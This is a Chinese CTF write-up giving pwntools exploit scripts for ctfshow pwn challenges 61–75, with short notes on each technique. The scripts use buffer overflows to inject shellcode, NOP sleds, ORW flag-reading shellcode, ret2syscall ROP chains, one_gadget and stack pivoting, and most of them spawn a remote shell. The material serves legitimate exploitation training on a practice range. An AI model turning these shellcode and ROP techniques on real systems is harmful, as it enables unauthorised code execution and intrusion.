<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28272)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh()).ljust(0x70, b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">buf2_addr = 0x804A080</span><br><span class="line"></span><br><span class="line">payload = shellcode + p32(buf2_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;CTFshow-pwn can u pwn me here!!\n&#x27;, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn61（ret2shellcode）"><a href="#pwn61（ret2shellcode）" class="headerlink" title="pwn61（ret2shellcode）"></a>pwn61（ret2shellcode）</h3><blockquote>
<p>这里需要注意一个问题，leave操作相当于mov rsp, rbp; pop rbp;而我们的shellcode中包含对rsp的操作，所以leave会影响我们shellcode的执行，因此我们的shellcode不能直接放在v5上，而应该放在其后面</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28164)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;[&#x27;)</span><br><span class="line">v5_addr = p.recvuntil(&#x27;]&#x27;, drop=True)</span><br><span class="line">v5_addr = int(v5_addr, 16)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload = cyclic(0x10 + 8) + p64(v5_addr + 0x10 + 8 + 8) + shellcode</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn62（ret2shellcode）"><a href="#pwn62（ret2shellcode）" class="headerlink" title="pwn62（ret2shellcode）"></a>pwn62（ret2shellcode）</h3><blockquote>
<p>基本步骤同上，但是本题给出的read函数能读取的长度有限，因此不能直接使用pwntools中的shellcode，需要自行构造shellcode</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28111)</span><br><span class="line"></span><br><span class="line">padding = 0x10+8</span><br><span class="line">shell_code = b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span><br><span class="line">p.recvuntil(&quot;What&#x27;s this : [&quot;)</span><br><span class="line">v5_addr = eval(p.recvuntil(&quot;]&quot;,drop=True))</span><br><span class="line">print(hex(v5_addr))</span><br><span class="line">payload = cyclic(padding) + p64(v5_addr + padding + 8) + shell_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn63（ret2shellcode）"><a href="#pwn63（ret2shellcode）" class="headerlink" title="pwn63（ret2shellcode）"></a>pwn63（ret2shellcode）</h3><blockquote>
<p>同上，因为这里我的shellcode足够短，因此两问用同一个exp就好啦</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28234)</span><br><span class="line"></span><br><span class="line">padding = 0x10+8</span><br><span class="line">shell_code = b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span><br><span class="line">p.recvuntil(&quot;What&#x27;s this : [&quot;)</span><br><span class="line">v5_addr = eval(p.recvuntil(&quot;]&quot;,drop=True))</span><br><span class="line">print(hex(v5_addr))</span><br><span class="line">payload = cyclic(padding) + p64(v5_addr + padding + 8) + shell_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn64（ret2shellcode）"><a href="#pwn64（ret2shellcode）" class="headerlink" title="pwn64（ret2shellcode）"></a>pwn64（ret2shellcode）</h3><blockquote>
<p>buf &#x3D; mmap(0, 0x400u, 7, 34, 0, 0);</p>
</blockquote>
<blockquote>
<p>这里用到mmap分配地址，7：可读可写可执行，因此我们还是可以直接将shellcode写入buf中</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28304)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn65（ret2shellcode）"><a href="#pwn65（ret2shellcode）" class="headerlink" title="pwn65（ret2shellcode）"></a>pwn65（ret2shellcode）</h3><blockquote>
<p>这题就是在一般shellcode的基础上，过滤掉了一些不可见字符。因此这里我们需要使用工具alpha3，将我们的shellcode转化为可见字符串形式</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/TaQini/alpha3.git</span><br><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28289)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Shellcode&quot;)</span><br><span class="line"></span><br><span class="line">shellcode = &quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn66（ret2shellcode）"><a href="#pwn66（ret2shellcode）" class="headerlink" title="pwn66（ret2shellcode）"></a>pwn66（ret2shellcode）</h3><blockquote>
<p>‘&#x2F;x00’跳过检查然后+任意字符如’&#x2F;xc0’组成一个汇编语句组到shellcode中</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28128)</span><br><span class="line"></span><br><span class="line">shellcode = &#x27;\x00\xc0&#x27; + asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn67（ret2shellcode-nop-sled）"><a href="#pwn67（ret2shellcode-nop-sled）" class="headerlink" title="pwn67（ret2shellcode + nop sled）"></a>pwn67（ret2shellcode + nop sled）</h3><blockquote>
<p>nop sled：说白了就是我们知道我们写入的shellcode的一个大致范围，但是具体位置不清楚。因此我们可以通过向这片区域填充nop来达到使程序计数器加一的目的，从而让程序最终运行到我们需要的shellcode的位置</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28234)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;location: 0x&#x27;)</span><br><span class="line">addr = int(p.recvuntil(&#x27;\n&#x27;, drop=True), 16)</span><br><span class="line"></span><br><span class="line">log.success(hex(addr))</span><br><span class="line"></span><br><span class="line">payload = 1336 * b&#x27;\x90&#x27; + shellcode</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;&gt; &#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;&gt; &#x27;)</span><br><span class="line">addr = addr + 0x2d + 668</span><br><span class="line">p.send(hex(addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn68（ret2shellcode-nop-sled）"><a href="#pwn68（ret2shellcode-nop-sled）" class="headerlink" title="pwn68（ret2shellcode + nop sled）"></a>pwn68（ret2shellcode + nop sled）</h3><blockquote>
<p>同上</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28171)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;location: 0x&#x27;)</span><br><span class="line">addr = int(p.recvuntil(&#x27;\n&#x27;, drop=True), 16)</span><br><span class="line"></span><br><span class="line">log.success(hex(addr))</span><br><span class="line"></span><br><span class="line">payload = b&#x27;\x90&#x27; * 1336 + shellcode</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;&gt; &#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">addr = addr + 0x15 + 0x8 + 0x8 + 668</span><br><span class="line">p.recvuntil(&#x27;&gt; &#x27;)</span><br><span class="line">p.send(hex(addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn69（ret2shellcode-orw）"><a href="#pwn69（ret2shellcode-orw）" class="headerlink" title="pwn69（ret2shellcode + orw）"></a>pwn69（ret2shellcode + orw）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, 28118)</span><br><span class="line"></span><br><span class="line">addr=0x123000</span><br><span class="line"></span><br><span class="line">jmp_rsp=0x0000000000400A01</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.read(0,addr,0x100))+asm(&quot;mov rax,0x123000; jmp rax&quot;)</span><br><span class="line"></span><br><span class="line">payload=payload.ljust(0x28,b&#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">payload += p64(jmp_rsp) + asm(&quot;sub rsp,0x30; jmp rsp&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;to do&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)   </span><br><span class="line"></span><br><span class="line">payload1 = shellcraft.open(&#x27;/ctfshow_flag&#x27;,0)</span><br><span class="line"></span><br><span class="line">payload1 += shellcraft.read(3, addr, 100)</span><br><span class="line"></span><br><span class="line">payload1 += shellcraft.write(1, addr, 100)</span><br><span class="line"></span><br><span class="line">payload1=asm(payload1) </span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()    </span><br></pre></td></tr></table></figure>

<h3 id="pwn70（ret2shellcode-orw）"><a href="#pwn70（ret2shellcode-orw）" class="headerlink" title="pwn70（ret2shellcode + orw）"></a>pwn70（ret2shellcode + orw）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28175</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            push 0</span></span><br><span class="line"><span class="string">            mov r15, 0x67616c66</span></span><br><span class="line"><span class="string">            push r15</span></span><br><span class="line"><span class="string">            mov rdi, rsp</span></span><br><span class="line"><span class="string">            mov rsi, 0</span></span><br><span class="line"><span class="string">            mov rax, 2</span></span><br><span class="line"><span class="string">            syscall </span></span><br><span class="line"><span class="string">            mov r14, 3</span></span><br><span class="line"><span class="string">            mov rdi, r14</span></span><br><span class="line"><span class="string">            mov rsi, rsp</span></span><br><span class="line"><span class="string">            mov rdx, 0xff</span></span><br><span class="line"><span class="string">            mov rax, 0</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov rdi,1</span></span><br><span class="line"><span class="string">            mov rsi, rsp</span></span><br><span class="line"><span class="string">            mov rdx, 0xff</span></span><br><span class="line"><span class="string">            mov rax, 1</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = asm(shellcode)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn71（ret2syscall）"><a href="#pwn71（ret2syscall）" class="headerlink" title="pwn71（ret2syscall）"></a>pwn71（ret2syscall）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import <span class="operator">*</span></span><br><span class="line"></span><br><span class="line">p <span class="operator">=</span> remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28166</span>)</span><br><span class="line"></span><br><span class="line">pop_eax <span class="operator">=</span> <span class="number">0x80bb196</span></span><br><span class="line">pop_edx_ecx_ebx <span class="operator">=</span> <span class="number">0x806eb90</span></span><br><span class="line">int_80 <span class="operator">=</span> <span class="number">0x8049421</span></span><br><span class="line"></span><br><span class="line">bin_sh_addr <span class="operator">=</span> <span class="number">0x80BE408</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">offset</span> <span class="operator">=</span> <span class="number">112</span></span><br><span class="line"></span><br><span class="line">payload <span class="operator">=</span> b<span class="string">&#x27;a&#x27;</span> <span class="operator">*</span> <span class="keyword">offset</span> <span class="operator">+</span> p32(pop_eax) <span class="operator">+</span> p32(<span class="number">0xb</span>) <span class="operator">+</span> p32(pop_edx_ecx_ebx) <span class="operator">+</span> p32(<span class="number">0</span>) <span class="operator">+</span> p32(<span class="number">0</span>) <span class="operator">+</span> p32(bin_sh_addr) <span class="operator">+</span> p32(int_80) </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Try to use ret2syscall!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn72（ret2syscall）"><a href="#pwn72（ret2syscall）" class="headerlink" title="pwn72（ret2syscall）"></a>pwn72（ret2syscall）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28131</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x80bb2c6</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x806ecb0</span></span><br><span class="line">int_80 = <span class="number">0x806F350</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x80eb000</span></span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x8048E24</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p32(pop_eax) + p32(<span class="number">0x3</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0x10</span>) + p32(bss_addr) + p32(<span class="number">0</span>) + p32(int_80) + p32(pop_eax) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(int_80)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;where is my system?\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn73（ret2syscall）"><a href="#pwn73（ret2syscall）" class="headerlink" title="pwn73（ret2syscall）"></a>pwn73（ret2syscall）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28181</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">28</span></span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x80b81c6</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x806f050</span></span><br><span class="line"></span><br><span class="line">int_80 = <span class="number">0x806F630</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x80EAF80</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p32(pop_eax) + p32(<span class="number">0x3</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0x10</span>) + p32(bss_addr) + p32(<span class="number">0</span>) + p32(int_80)</span><br><span class="line">payload += p32(pop_eax) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(int_80)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn74（one-gadget）"><a href="#pwn74（one-gadget）" class="headerlink" title="pwn74（one_gadget）"></a>pwn74（one_gadget）</h3><blockquote>
<p>one_gadget是libc中存在的一些执行<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>的片段，当可以泄露libc地址，并且可以知道libc版本的时候，可以使用此方法来快速控制指令寄存器开启shell。</p>
<p>相比于<code>system(&quot;/bin/sh&quot;)</code>，这种方式更加方便，不用控制RDI、RSI、RDX等参数。运用于不利构造参数的情况。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28122</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0x10a2fc</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;this:&#x27;</span>)</span><br><span class="line">print_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libcbase = print_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>] </span><br><span class="line"></span><br><span class="line">payload = one_gadget + libcbase</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn75（栈迁移）"><a href="#pwn75（栈迁移）" class="headerlink" title="pwn75（栈迁移）"></a>pwn75（栈迁移）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28144</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../code/pwn&#x27;</span>)</span><br><span class="line">leave_ret = <span class="number">0x8048766</span></span><br><span class="line">sys_addr = <span class="number">0x8048400</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;codename:&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * (offset - <span class="number">0x4</span>) + <span class="string">b&#x27;show&#x27;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;show&#x27;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">buf = ebp - <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload2 = (p32(sys_addr) + p32(<span class="number">0</span>) + p32(buf + <span class="number">12</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span>) + p32(buf - <span class="number">4</span>) + p32(leave_ret)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

